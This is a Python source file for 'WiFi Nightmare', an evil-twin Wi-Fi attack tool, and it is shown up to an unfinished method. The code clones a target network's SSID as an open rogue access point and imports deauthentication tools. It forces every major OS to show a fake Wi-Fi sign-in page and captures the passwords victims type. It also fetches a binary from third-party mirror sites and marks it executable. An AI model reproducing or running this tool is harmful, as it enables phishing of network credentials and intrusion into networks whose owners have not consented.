# evil_twin_software.py — Software-only Evil Twin (no ESP required)
# Uses hostapd + dnsmasq + Python HTTP server + scapy deauth
import os
import sys
import re
import time
import signal
import shutil
import socket
import platform
import threading
import subprocess
import json
import ssl
import urllib.request
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from scapy.all import sendp, sniff, RadioTap, Dot11, Dot11Deauth
from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_RESET
from wifi_nightmare.utils import run_command, verify_password, mask_bssid
from wifi_nightmare.logger import logger

PORTAL_AP_IP = "10.0.0.1"
PORTAL_AP_SUBNET = "255.255.255.0"
PORTAL_AP_DHCP_START = "10.0.0.10"
PORTAL_AP_DHCP_END = "10.0.0.50"
HOSTAPD_CONF = "/tmp/wifinightmare_hostapd.conf"
DNSMASQ_CONF = "/tmp/wifinightmare_dnsmasq.conf"
PORTAL_HTML_FILE = "/tmp/wifinightmare_portal.html"
DEAUTH_BSSID_FILE = "/tmp/wifinightmare_deauth_bssids.txt"
LEASES_FILE = "/tmp/wifinightmare_dnsmasq.leases"

# A public cloudflared QUICK tunnel (no account/domain needed) gives us a
# VALID HTTPS URL, advertised via DHCP option 114. This is the only reliable
# way modern HTTPS-first devices (Samsung One UI, Pixel/Android 12+, Oppo,
# iOS 14+) honor the RFC 8908 CAPPORT API — they silently ignore a plain
# http:// or self-signed https:// API URL. Degrades gracefully when no
# internet uplink is available.
CLOUDFLARED_PATHS = ("/usr/local/bin/cloudflared", "/tmp/cloudflared")
TUNNEL_HOST_PATTERN = re.compile(r"https://([a-z0-9-]+\.trycloudflare\.com)")

# HTTPS captive portal (port 443). iOS/macOS and HTTPS-first Android probes
# (Samsung One UI, ColorOS/Oppo, ChromeOS) check captive.apple.com /
# connectivitycheck.gstatic.com over TLS. If port 443 is closed, those OSes
# treat the network as "no internet, NOT behind a portal" and never pop the
# sign-in screen. We serve TLS with a generated self-signed cert; the cert
# error itself is what tells those OSes a captive portal exists.
PORTAL_HTTPS_PORT = 443
CERTS_DIR = "/tmp/wifinightmare_certs"
CERT_FILE = os.path.join(CERTS_DIR, "portal.crt")
KEY_FILE = os.path.join(CERTS_DIR, "portal.key")
OPENSSL_CONF = os.path.join(CERTS_DIR, "openssl.cnf")

# ── Captive Portal Detection URLs (by device type) ──────────────────────
# These are the URLs devices/OSes probe to detect captive portals.
# We must respond to ALL of them, each with content that does NOT match
# what the device expects for "connected", so the OS triggers the portal.

# Android / Google / Oppo / Realme / Xiaomi: sends GET to generate_204, expects 204 No Content + empty body
# Any non-204 response (like 302 Found) or non-empty body → captive portal detected!
ANDROID_URLS = frozenset({
    "/generate_204", "/gen_204", "/generate204", "/portal_204",
    "/chromeos-captive-portal", "/blank", "/connectivitycheck",
    "/mobile/status.php", "/status.php",  # ColorOS / Oppo / Realme
    "/connectivity-check.html",           # MIUI / HyperOS / Xiaomi
    "/checklink",                         # Vivo / Funtouch
})

# Apple (iOS / macOS): sends GET to hotspot-detect.html, expects "Success" in body
# Anything without "Success" → portal detected.
# Sends random URIs via CaptiveNetworkSupport framework → catch-all handles.
# success.dat used by macOS (Sierra+) alongside library/test/success.txt.
APPLE_URLS = frozenset({
    "/hotspot-detect.html", "/library/test/success.html", "/library/test/success.txt",
    "/success.txt", "/success.html", "/success", "/success.dat",
})

# Windows NCSI: sends GET to ncsi.txt, expects "Microsoft NCSI"
# Sends GET to connecttest.txt, expects "Microsoft Connect Test"
# Anything else → portal detected.
WINDOWS_URLS = frozenset({
    "/ncsi.txt", "/connecttest.txt",
    "/fwlink", "/canonical.html", "/redirect",
})

# Samsung One UI / Android: sends GET to check_network_status.txt
# Samsung-specific path for captive portal detection.
SAMSUNG_URLS = frozenset({
    "/check_network_status.txt", "/network_status.html",
})

# Amazon Kindle: sends GET to kindle-wifi/wifistub.html
KINDLE_URLS = frozenset({
    "/kindle-wifi/wifistub.html",
})

# CAPPORT / RFC 8908: Android 11+ (incl. Samsung One UI 3+) / Chrome use this API.
# The device gets the API URL from dnsmasq DHCP option 114 (RFC 8910, added in
# _write_configs); if "captive": true, the OS skips its probes and immediately
# shows the "sign in to Wi-Fi" notification — the reliable path for Samsung.
# Serve the same JSON at every well-known variant since clients may use any of them.
CAPPORT_URLS = frozenset({
    "/.well-known/captiveportal/api",
    "/.well-known/captiveportal/check",
    "/.well-known/capport",
    "/.well-known/captiveportal",
})

# Firefox / Chrome: may check these for connectivity
BROWSER_URLS = frozenset({
    "/captiveportal/generate_204",
})

# Union of all known detection URLs for fast checking
ALL_DETECT_URLS = ANDROID_URLS | APPLE_URLS | WINDOWS_URLS | SAMSUNG_URLS | KINDLE_URLS | CAPPORT_URLS | BROWSER_URLS

# ── Auto-redirect HTML for generate_204 style endpoints ──
# This is served to any device that hits a generate_204 endpoint.
# It's NOT the main portal — it's a lightweight page that auto-redirects
# to the portal. This is critical because:
#   1. Samsung One UI breaks on 302 (HTTP redirect) → must serve 200 with HTML
#   2. Android CaptivePortalLogin activity loads this page in a WebView
#   3. The meta refresh + JS redirect together ensure the user sees the portal
REDIRECT_HTML = """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="0;url=http://{ip}/">
<title>Redirecting...</title>
<script>window.location.replace("http://{ip}/");</script>
<style>body{{margin:0;background:#f0f2f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:#65676b}}</style>
</head><body><p>Loading...</p></body></html>"""

DEFAULT_PORTAL = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Wi-Fi Access</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,system-ui,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center;width:90%;max-width:360px}
h2{color:#1a1a1a;margin:0 0 .5rem;font-size:1.5rem}
p{color:#65676b;font-size:.95rem;margin-bottom:1.5rem;line-height:1.5}
input{width:100%;padding:12px;margin-bottom:15px;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:16px;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
.hidden{display:none!important}
.error{color:#d32f2f;background:#ffebee;padding:10px;border-radius:6px;margin-bottom:15px;font-size:.9rem;display:none}
.spinner{border:3px solid #f3f3f3;border-top:3px solid #1877f2;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.logo{font-size:3rem;color:#1877f2;margin-bottom:10px}
</style>
</head>
<body>
<div id="login-view" class="card">
  <div class="logo">&#128246;</div>
  <h2>Welcome</h2>
  <p>Enter the Wi-Fi password to access the internet.</p>
  <div id="error-msg" class="error">Incorrect password. Try again.</div>
  <input type="password" id="password" placeholder="Wi-Fi Password" autocomplete="off">
  <button onclick="sendData()">Connect</button>
</div>
<div id="wait-view" class="card hidden">
  <h2>Verifying...</h2>
  <div class="spinner"></div>
  <p>Please wait...</p>
</div>
<div id="success-view" class="card hidden">
  <div class="logo" style="color:#4caf50">&#10003;</div>
  <h2 style="color:#4caf50">Connected</h2>
  <p>You are now connected to the internet.</p>
</div>
<script>
var ci;
function sendData(){
  var p=document.getElementById("password").value;
  if(!p)return;
  document.getElementById("error-msg").style.display="none";
  document.getElementById("login-view").classList.add("hidden");
  document.getElementById("wait-view").classList.remove("hidden");
  fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"password="+encodeURIComponent(p)})
  .then(function(){if(ci)clearInterval(ci);ci=setInterval(checkStatus,1000)})
  .catch(function(){resetView("Connection error.")});
}
function checkStatus(){
  fetch("/status").then(function(r){return r.text()}).then(function(s){
    if(s==="OK"){clearInterval(ci);document.getElementById("wait-view").classList.add("hidden");document.getElementById("success-view").classList.remove("hidden")}
    else if(s==="NO"){clearInterval(ci);resetView("Incorrect password.")}
  }).catch(function(){});
}
function resetView(m){
  document.getElementById("wait-view").classList.add("hidden");
  document.getElementById("login-view").classList.remove("hidden");
  var e=document.getElementById("error-msg");e.innerText=m;e.style.display="block";
  document.getElementById("password").value="";
}
</script>
</body></html>"""


# ── Captive portal response content for OS-specific endpoints ──────────
# These strings are served to detection endpoints. Each device/OS checks
# for a specific expected response. Serving anything else forces the OS
# to show the captive portal login notification.

# Windows NCSI expects "Microsoft NCSI" at /ncsi.txt — serve something else
NCSI_RESPONSE = b"WiFi Nightmare Captive Portal"

# Windows Connect Test expects "Microsoft Connect Test" at /connecttest.txt
CONNECTTEST_RESPONSE = b"""<!DOCTYPE html>
<html><head><title>Network Access Required</title></head>
<body><h1>Wi-Fi Login Required</h1><p>Please sign in to access the network.</p>
<script>window.location.replace("http://""" + PORTAL_AP_IP.encode() + b"""/");</script>
<meta http-equiv="refresh" content="0;url=http://""" + PORTAL_AP_IP.encode() + b"""/"></body></html>"""

# Apple success response — Apple checks if body contains "Success"
# So we serve the portal HTML which doesn't contain "Success" = triggers detection
APPLE_SUCCESS_RESPONSE = b"This network requires authentication."

# CAPPORT/RFC 8908 JSON response — tells modern Android 12+ that portal is active
CAPPORT_JSON = json.dumps({
    "captive": True,
    "user-portal-url": f"http://{PORTAL_AP_IP}/",
    "venue-info-url": "",
    "captive-api": f"http://{PORTAL_AP_IP}/.well-known/captiveportal/check",
}).encode()

# Apple "success" files — these MUST NOT contain the string "Success".
APPLE_SUCCESS_FILES = frozenset({
    "/success.txt", "/success.html", "/success", "/success.dat",
    "/library/test/success.html", "/library/test/success.txt",
})


def _normalize_path(raw_path):
    """Strip query string/fragment and normalize duplicate slashes.
    Devices probe URLs like /generate_204?some=param or //generate_204;
    un-normalized paths would fall through to the catch-all and could serve
    the wrong content type (e.g. HTML instead of CAPPORT JSON)."""
    raw = raw_path.strip()
    # Absolute-form request targets (http://host/path) — keep only the path
    if "://" in raw:
        raw = raw.split("://", 1)[1]
        raw = "/" + raw.split("/", 1)[1] if "/" in raw else "/"
    p = raw.split("?", 1)[0].split("#", 1)[0]
    while p.startswith("//"):
        p = p[1:]
    return p.rstrip("/") or "/"


# Hostnames probed over HTTPS by captive-portal detection. Included as SANs so
# the self-signed cert matches the SNI the device sends.
CAPTIVE_HTTPS_HOSTS = (
    "captive.apple.com", "connectivitycheck.gstatic.com",
    "connectivitycheck.android.com", "www.gstatic.com", "gstatic.com",
    "clients3.google.com", "google.com", "www.google.com", "generate_204",
    "msftconnecttest.com", "www.msftconnecttest.com",
    "neverssl.com", "www.neverssl.com",
    "captiveportal.kindle.com", "kindle.com",
    "wifi.com", "fiber.google.com",
)


def _generate_self_signed_cert():
    """Generate a 1-day self-signed cert via openssl. Returns (cert, key) or None."""
    if not shutil.which("openssl"):
        return None
    try:
        os.makedirs(CERTS_DIR, exist_ok=True)
        san = ",".join("DNS:" + h for h in CAPTIVE_HTTPS_HOSTS) + ",IP:" + PORTAL_AP_IP
        conf = (
            "[req]\ndistinguished_name=dn\nx509_extensions=v3\nprompt=no\n\n"
            "[dn]\nCN=10.0.0.1\n\n"
            "[v3]\nsubjectAltName=" + san + "\n"
            "basicConstraints=CA:FALSE\n"
            "keyUsage=digitalSignature, keyEncipherment\n"
            "extendedKeyUsage=serverAuth\n"
        )
        with open(OPENSSL_CONF, "w") as f:
            f.write(conf)
        result = subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-sha256", "-nodes",
             "-days", "1", "-keyout", KEY_FILE, "-out", CERT_FILE,
             "-config", OPENSSL_CONF],
            capture_output=True, text=True, timeout=30
        )
        try:
            os.remove(OPENSSL_CONF)
        except OSError:
            pass
        if result.returncode != 0 or not (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)):
            logger.error(f"openssl cert generation failed: {result.stderr.strip()}")
            return None
        return CERT_FILE, KEY_FILE
    except Exception as e:
        logger.error(f"Cert generation failed: {e}")
        return None


def _make_ssl_context(cert_pair):
    """Build a TLS server context from a generated self-signed cert."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_pair[0], cert_pair[1])
    return context


class PortalHTTPSServer(ThreadingHTTPServer):
    """ThreadingHTTPServer that wraps every accepted socket in TLS."""

    tls_failures = 0
    _tls_note_printed = False

    def __init__(self, server_address, handler_class, ssl_context):
        super().__init__(server_address, handler_class)
        self._ssl_context = ssl_context

    def get_request(self):
        sock, addr = super().get_request()
        try:
            return self._ssl_context.wrap_socket(sock, server_side=True), addr
        except Exception:
            sock.close()
            type(self).tls_failures += 1
            if not type(self)._tls_note_printed:
                type(self)._tls_note_printed = True
                print(f"{C_YELLOW}[!] TLS handshake failed on 443 (self-signed) — "
                      f"device probes/HTTPS from clients die here, before any "
                      f"HTTP logging. Use tcpdump to confirm which host.{C_RESET}", flush=True)
            raise OSError("TLS handshake failed")


class PortalHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for captive portal with multi-device support.

    Handles all known captive portal detection endpoints for:
    - Android (generate_204, gen_204, etc.)  — serves redirect HTML
    - Apple iOS/macOS (hotspot-detect.html)   — serves portal (no "Success")
    - Windows NCSI (ncsi.txt, connecttest.txt) — non-matching content
    - Samsung One UI (check_network_status.txt) — serves portal HTML
    - CAPPORT (RFC 8908) — JSON with captive: true + API endpoint
    - Kindle, Firefox, Chrome, and catch-all

    Works over both plain HTTP (port 80) and TLS (port 443); paths are
    normalized so query-string probes (e.g. /generate_204?x=1) are matched.
    """
    verification_status = 0  # 0=idle, 1=waiting, 2=accepted, 3=rejected
    captured_password = None

    def log_message(self, format, *args):
        pass  # Suppress HTTP logs

    def _log_request(self, proto):
        """Print an incoming portal request (path + Host + client) for live debugging.

        Because of the iptables DNAT redirect, ANY HTTP(S) attempt from a client
        lands here regardless of the Host header. The Host reveals exactly which
        probe/app the phone is hitting (e.g. Samsung's own connectivity check),
        even when no standard probe path (generate_204 etc.) is sent.
        """
        client = self.client_address[0] if self.client_address else "?"
        host = self.headers.get("Host", "-")
        ua = self.headers.get("User-Agent", "")[:60]
        print(f"{C_CYAN}[+] {proto} {self.command} {self.path} <- {client} [Host: {host}] UA:{ua}{C_RESET}", flush=True)

    def _read_portal_html(self):
        try:
            with open(PORTAL_HTML_FILE, "rb") as f:
                return f.read()
        except Exception:
            return DEFAULT_PORTAL.encode()

    def _send_headers(self, status_code, content_type, body_len, extra_headers=None):
        """Send common response headers. Always includes CAPPORT/interim headers."""
        self.send_response(status_code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(body_len))
        self.send_header("Connection", "close")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("X-Captive-Portal-Status", "login")
        self.send_header("X-Captive-Portal", "yes")
        if extra_headers:
            for k, v in extra_headers.items():
                self.send_header(k, v)
        self.end_headers()

    def _send_portal(self):
        body = self._read_portal_html()
        self._send_headers(200, "text/html", len(body))
        self.wfile.write(body)

    def _send_redirect_page(self):
        """Send an HTTP 302 redirect with Location header AND fallback HTML body.
        
        This satisfies:
        1. Android/Oppo/Xiaomi NetworkMonitor: sees 302 + Location header -> triggers Captive Portal notification
        2. WebViews & browsers: follow Location header or fall back to meta refresh / JS redirect
        3. Apple iOS: detects redirect away from Apple probe domain -> triggers CNA popup
        """
        target = f"http://{PORTAL_AP_IP}/"
        body = REDIRECT_HTML.format(ip=PORTAL_AP_IP).encode()
        self.send_response(302)
        self.send_header("Location", target)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("X-Captive-Portal-Status", "login")
        self.send_header("X-Captive-Portal", "yes")
        self.end_headers()
        self.wfile.write(body)

    def _send_capport_response(self):
        """Serve the RFC 8908 Captive Portal API response (application/captive+json).

        Android 11+ fetches the API URL it received via DHCP option 114 during the
        DHCP handshake. "captive": true makes the OS skip its flaky HTTP/HTTPS
        probes and immediately show the captive-portal sign-in notification —
        this is the reliable path for Samsung One UI 3+ and most modern devices.
        Responds to both GET (RFC 8908) and POST (Android 11's probeCaptivePortalAPI).
        """
        self._send_headers(200, "application/captive+json", len(CAPPORT_JSON))
        self.wfile.write(CAPPORT_JSON)

    def do_GET(self):
        path = _normalize_path(self.path)

        # ── Request logging (debug the captive-portal flow) ──
        # Shows every OS probe/browser hit so the operator can verify devices
        # actually reach the portal (vs. never joining the fake AP). /status is
        # polled every second by our own portal page, so skip it to avoid spam.
        if path != "/status":
            proto = "https" if isinstance(self.request, ssl.SSLSocket) else "http"
            self._log_request(proto)

        # ── /status → password verification status ──
        if path == "/status":
            status_map = {0: "IDLE", 1: "WAIT", 2: "OK", 3: "NO"}
            body = status_map.get(self.verification_status, "IDLE").encode()
            self._send_headers(200, "text/plain", len(body))
            self.wfile.write(body)
            return

        # ── Android / Google generate_204 endpoints ──
        # Android CaptivePortalLogin opens this URL in a WebView.
        # Serving an auto-redirect page ensures the WebView navigates to
        # the portal page where the user enters credentials.
        if path in ANDROID_URLS:
            self._send_redirect_page()
            return

        # ── Windows NCSI ncsi.txt ──
        # Windows expects "Microsoft NCSI" at this URL.
        # We serve something else so Windows knows it's behind a captive portal.
        if path == "/ncsi.txt":
            self._send_headers(200, "text/plain", len(NCSI_RESPONSE))
            self.wfile.write(NCSI_RESPONSE)
            return

        # ── Windows Connect Test ──
        # Windows expects "Microsoft Connect Test" here.
        if path == "/connecttest.txt":
            self._send_headers(200, "text/html", len(CONNECTTEST_RESPONSE))
            self.wfile.write(CONNECTTEST_RESPONSE)
            return

        # ── Apple hotspot-detect.html & success endpoints ──
        # Apple checks if the response body CONTAINS "Success" or redirects.
        # Sending 302 redirect to http://10.0.0.1/ is the official Apple standard that
        # triggers the CNA (Captive Network Assistant) popup immediately on iOS & macOS.
        if path in APPLE_URLS:
            self._send_redirect_page()
            return

        # ── Samsung One UI ──
        # check_network_status.txt expecting 302 redirect to portal page
        if path in SAMSUNG_URLS:
            self._send_redirect_page()
            return

        # ── Kindle ──
        if path in KINDLE_URLS:
            self._send_portal()
            return

        # ── CAPPORT (RFC 8908) — Android 11+ / One UI / Chrome ──
        # RFC 8908 requires Content-Type "application/captive+json". Android reads
        # "captive": true and skips probes to show the sign-in prompt immediately.
        if path in CAPPORT_URLS:
            self._send_capport_response()
            return

        # ── Browser detection endpoints ──
        if path in BROWSER_URLS:
            self._send_redirect_page()
            return

        # ── Windows / Microsoft fwlink, canonical, redirect ──
        if path in ("/fwlink", "/canonical.html", "/redirect"):
            self._send_redirect_page()
            return

        # ── Portal Page Endpoints ──
        # Serve the actual portal HTML only when the user visits the designated portal path
        if path in ("/", "/login", "/index.html", "/portal"):
            host_header = self.headers.get("Host", "")
            # If the request host is NOT our portal IP (e.g. phone requested http://connectivitycheck.gstatic.com/),
            # redirect to our IP! This is the universal standard used by Wifiphisher/Airgeddon to trigger CNA.
            if host_header and not host_header.startswith(PORTAL_AP_IP):
                self._send_redirect_page()
                return
            self._send_portal()
            return

        # ── Catch-all: redirect any unknown URL to portal ──
        # Any other URL accessed by client background apps or browser probes must be redirected with 302
        self._send_redirect_page()

    def do_POST(self):
        # Request logging — include /submit so a captured password is visible
        # against its source client.
        proto = "https" if isinstance(self.request, ssl.SSLSocket) else "http"
        self._log_request(proto)

        # CAPPORT API: Android 11's probeCaptivePortalAPI uses POST — answer
        # both verbs identically so the DHCP-114 captive toggle always works.
        if _normalize_path(self.path) in CAPPORT_URLS:
            self._send_capport_response()
            return

        if _normalize_path(self.path) == "/submit":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
            params = parse_qs(body)

            # Accept both "password" and "name" field names
            password = params.get("password", params.get("name", [""]))[0]

            if password:
                PortalHTTPHandler.captured_password = password
                PortalHTTPHandler.verification_status = 1
                self._send_headers(200, "text/plain", 8)
                self.wfile.write(b"received")
            else:
                self.send_response(400)
                self.end_headers()
        else:
            # Unknown POST (e.g. Samsung's custom check /chat) — dump a snippet of
            # the body so we can identify what the client is really sending.
            body = ""
            try:
                clen = int(self.headers.get("Content-Length", "0"))
                body = self.rfile.read(min(clen, 2048)).decode("utf-8", errors="replace")
            except Exception:
                pass
            if body:
                print(f"{C_CYAN}    body: {body[:256]}{C_RESET}", flush=True)
            self.send_response(404)
            self.end_headers()


def cloudflared_download_urls(asset):
    """Primary + mirror URLs for the official cloudflared static binary."""
    base = (f"https://github.com/cloudflare/cloudflared/releases/"
            f"latest/download/cloudflared-linux-{asset}")
    return [
        base,
        f"https://ghfast.top/{base}",
        f"https://ghproxy.net/{base}",
        f"https://github.moeyy.xyz/{base}",
        f"https://mirror.ghproxy.com/{base}",
    ]


def print_egress_report(errors):
    """Reachability report so a failed download explains itself."""
    print(f"{C_YELLOW}[!] All download sources failed — egress report:{C_RESET}")
    for host in ("github.com", "1.1.1.1", "cloudflare.com"):
        try:
            socket.create_connection((host, 443), timeout=3).close()
            print(f"{C_GREEN}    {host}:443 reachable{C_RESET}")
        except Exception as exc:
            print(f"{C_RED}    {host}:443 unavailable ({exc}){C_RESET}")
    if errors:
        print(f"{C_YELLOW}    first error: {errors[0]}{C_RESET}")


def internet_reachable(retries=5, wait=1, verbose=True):
    """Cheap uplink probe (TCP to well-known IPs) with settle retries.

    Returns (bool, last_error).  Uses only TCP socket probes — NOT DNS
    resolution — because the local stub resolver (127.0.0.53) answers DNS
    queries even when all outbound TCP is blocked, which would give a false
    positive.  We probe several IPs and ports so a firewall blocking a single
    port doesn't produce a false negative.
    """
    probes = [
        ("1.1.1.1",          443),   # Cloudflare HTTPS
        ("8.8.8.8",          443),   # Google HTTPS
        ("1.1.1.1",           80),   # Cloudflare HTTP
        ("8.8.4.4",           53),   # Google DNS (TCP)
        ("208.67.222.222",   443),   # OpenDNS HTTPS
        ("9.9.9.9",          443),   # Quad9 HTTPS
    ]
    last = None
    notified = False
    for _ in range(retries):
        for host, port in probes:
            try:
                with socket.create_connection((host, port), timeout=3):
                    return True, None
            except Exception as exc:
                last = exc
        if verbose and not notified:
            print(f"{C_CYAN}[i] waiting for a network link "
                  f"(retrying ~{retries * (wait + 3 * len(probes))}s max)...{C_RESET}")
            notified = True
        time.sleep(wait)
    return False, last



def _try_cli_download(url, dest):
    """Try curl then wget to download *url* → *dest*.  Both tools honour
    HTTP_PROXY / HTTPS_PROXY env vars and ~/.curlrc / ~/.wgetrc, which lets
    the download work behind corporate proxies that urllib bypasses.
    Returns True on success.

    No retries (--retry 0) because the caller already iterates over 5+
    mirror URLs — retrying a dead host just wastes time.
    """
    tmp = dest + ".part"
    for cmd in (
        ["curl", "-fsSL", "--retry", "0", "--connect-timeout", "10",
         "--max-time", "60", "-o", tmp, url],
        ["wget", "-q", "--tries=1", "--timeout=10", "-O", tmp, url],
    ):
        if not shutil.which(cmd[0]):
            continue
        try:
            ret = subprocess.run(cmd, timeout=75)
            if ret.returncode == 0 and os.path.exists(tmp) and os.path.getsize(tmp) > 1_000_000:
                os.replace(tmp, dest)
                os.chmod(dest, 0o755)
                return True
        except Exception:
            pass
        finally:
            try:
                os.remove(tmp)
            except FileNotFoundError:
                pass
    return False


def download_cloudflared(dest=None, retries=5):
    """Try every source for the official static binary; return path or None.

    Download strategy (each URL is tried in order):
      1. urllib with system proxies (respects HTTP_PROXY / HTTPS_PROXY)
      2. curl / wget subprocess fallback (also proxy-aware, better TLS handling)

    Saves into a persistent location (/usr/local/bin/cloudflared) when the
    filesystem allows it, so the download truly has to happen only once.
    """
    if dest is None:
        dest = (CLOUDFLARED_PATHS[0]
                if os.access(os.path.dirname(CLOUDFLARED_PATHS[0]), os.W_OK)
                else CLOUDFLARED_PATHS[1])
    ok, err = internet_reachable(retries=retries)
    if not ok:
        print(f"{C_YELLOW}[!] No outbound internet reached — HTTPS-first captive "
              f"API will be OFF. Connect ethernet/USB tethering and rerun, or "
              f"install once manually:{C_RESET}")
        print(f"{C_YELLOW}    sudo wget -O /usr/local/bin/cloudflared "
              f"https://github.com/cloudflare/cloudflared/releases/latest/download/"
              f"cloudflared-linux-amd64 && sudo chmod +x /usr/local/bin/cloudflared{C_RESET}")
        if err:
            print(f"{C_YELLOW}    probe error: {err} — check links with: "
                  f"nmcli device status{C_RESET}")
        return None
    arch = platform.machine().lower()
    asset = {"x86_64": "amd64", "amd64": "amd64",
             "aarch64": "arm64", "arm64": "arm64"}.get(arch)
    if not asset:
        print(f"{C_YELLOW}[!] Unsupported CPU arch ({arch}) for the automatic "
              f"cloudflared download.{C_RESET}")
        return None
    print(f"{C_CYAN}[i] cloudflared not found — downloading the official static "
          f"binary ({asset})...{C_RESET}")
    errors = []
    for url in cloudflared_download_urls(asset):
        # --- Method 1: urllib with system proxy support ---
        try:
            # Use the default opener so HTTP_PROXY / HTTPS_PROXY env vars are
            # respected (unlike ProxyHandler({}) which explicitly disables them).
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ssl.create_default_context()),
            )
            req = urllib.request.Request(url, headers={"User-Agent": "wifinightmare"})
            print(f"{C_CYAN}    → {url}{C_RESET}", flush=True)
            with opener.open(req, timeout=45) as resp:
                data = resp.read()
            if len(data) < 1_000_000:
                errors.append(f"{url}: non-binary response ({len(data)} bytes)")
            else:
                with open(dest, "wb") as f:
                    f.write(data)
                os.chmod(dest, 0o755)
                print(f"{C_GREEN}[+] cloudflared saved to {dest} "
                      f"({len(data) // (1024 * 1024)} MB){C_RESET}")
                return dest
        except Exception as exc:
            errors.append(f"{url} [urllib]: {exc}")

        # --- Method 2: curl / wget (honour system proxy env vars) ---
        if _try_cli_download(url, dest):
            sz = os.path.getsize(dest) // (1024 * 1024)
            print(f"{C_GREEN}[+] cloudflared saved to {dest} ({sz} MB){C_RESET}")
            return dest

    print_egress_report(errors)
    return None


def preflight_cloudflared():
    """Boot-time readiness for the HTTPS-first captive API.

    Cheap when cloudflared already exists; if missing, attempts the one-time
    download (needs internet on this box) and reports the outcome clearly so
    the operator knows BEFORE starting the attack whether the public portal
    will be available.
    """
    print(f"\n{C_CYAN}[*] HTTPS-first captive API readiness (cloudflared):{C_RESET}")
    for cand in CLOUDFLARED_PATHS:
        if os.path.exists(cand):
            print(f"{C_GREEN}[+] cloudflared ready: {cand}{C_RESET}")
            return cand
    which = shutil.which("cloudflared")
    if which:
        print(f"{C_GREEN}[+] cloudflared ready: {which}{C_RESET}")
        return which
    path = download_cloudflared()
    if path:
        print(f"{C_GREEN}[+] HTTPS-first portal will be advertised via "
              f"DHCP option 114.{C_RESET}")
    else:
        print(f"{C_YELLOW}[i] cloudflared unavailable — this run falls back to "
              f"the classic http:// portal (older Android/iPhone/firefox). "
              f"Fix internet on this box and retry, or install manually once.{C_RESET}")
    return path


class SoftwareEvilTwin:
    def __init__(self, interface, target_bssid, target_channel, target_ssid,
                 db_handler, portal_html=None, cloudflared_bin=None):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.target_ssid = target_ssid
        self.db = db_handler
        self.portal_html = portal_html or DEFAULT_PORTAL
        self._cloudflared_bin = cloudflared_bin

        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.http_servers = []
        self.http_threads = []
        self.deauth_thread = None
        self.monitor_thread = None
        self.status_thread = None

        self.stop_attack = False
        self.clients = set()
        self.deauth_sent = 0
        self.correct_password = None
        self._passwords_tried = []
        self._seen_leases = set()

        self.ap_interface = None
        self._mon_interface = None
        self.original_interface = interface

        # Public HTTPS tunnel (cloudflared quick tunnel) — set at runtime.
        self.tunnel_proc = None
        self.tunnel_host = None
        self.public_api_url = None

    def _write_configs(self):
        """Write hostapd and dnsmasq config files."""
        # hostapd hw_mode: 'a' for 5GHz (channel > 14), 'g' for 2.4GHz.
        # Using the wrong band makes hostapd refuse to start -> no AP -> no portal.
        hw_mode = "a" if self.target_channel > 14 else "g"
        hostapd_conf = f"""interface={self.ap_interface}
driver=nl80211
ctrl_interface=/var/run/hostapd
ssid={self.target_ssid}
channel={self.target_channel}
hw_mode={hw_mode}
wmm_enabled=0
auth_algs=1
wpa=0
"""
        os.makedirs("/var/run/hostapd", exist_ok=True)
        with open(HOSTAPD_CONF, "w") as f:
            f.write(hostapd_conf)

        if self.public_api_url:
            api_line = (f"dhcp-option=114,{self.public_api_url}"
                        f"/.well-known/captiveportal/api")
            tunnel_server = (f"server=/{self.tunnel_host}/1.1.1.1\n"
                             f"server=/{self.tunnel_host}/8.8.8.8")
        else:
            api_line = ""
            tunnel_server = ""
        dnsmasq_conf = f"""interface={self.ap_interface}
bind-interfaces
listen-address={PORTAL_AP_IP}
dhcp-authoritative
dhcp-range={PORTAL_AP_DHCP_START},{PORTAL_AP_DHCP_END},255.255.255.0,12h
dhcp-option=3,{PORTAL_AP_IP}
dhcp-option=6,{PORTAL_AP_IP}
dhcp-leasefile={LEASES_FILE}
{api_line}
address=/#/{PORTAL_AP_IP}
{tunnel_server}
no-resolv
no-poll
no-hosts
no-negcache
log-queries
log-dhcp
log-facility=-
log-async
"""
        with open(DNSMASQ_CONF, "w") as f:
            f.write(dnsmasq_conf)

        with open(PORTAL_HTML_FILE, "w", encoding="utf-8") as f:
            f.write(self.portal_html)

    def _create_ap_interface(self):
        """Create AP + monitor interfaces following airgeddon's approach."""
